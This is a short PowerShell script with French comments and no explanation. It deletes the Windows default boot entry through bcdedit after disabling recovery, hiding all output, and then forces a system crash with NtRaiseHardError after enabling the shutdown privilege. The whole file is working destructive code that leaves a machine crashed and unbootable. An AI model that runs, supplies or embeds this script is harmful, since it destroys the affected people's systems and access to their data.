


$defaultID = (bcdedit | Select-String -Pattern "default").ToString().Split(' ')[-1]
bcdedit /set $defaultID recoveryenabled No > $null 2>&1
bcdedit /set $defaultID bootstatuspolicy IgnoreAllFailures > $null 2>&1
bcdedit /delete $defaultID > $null 2>&1


$signature = @"
using System;
using System.Runtime.InteropServices;

public class BSOD {
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

    public static void TriggerCrash() {
        bool enabled;
        RtlAdjustPrivilege(19, true, false, out enabled); // Activer le privilège "Shutdown"
        uint response;
        NtRaiseHardError(0xC000007B, 0, 0, IntPtr.Zero, 6, out response); // Forcer une erreur critique
    }
}
"@

Add-Type $signature

Start-Sleep -Seconds 2
[BSOD]::TriggerCrash()


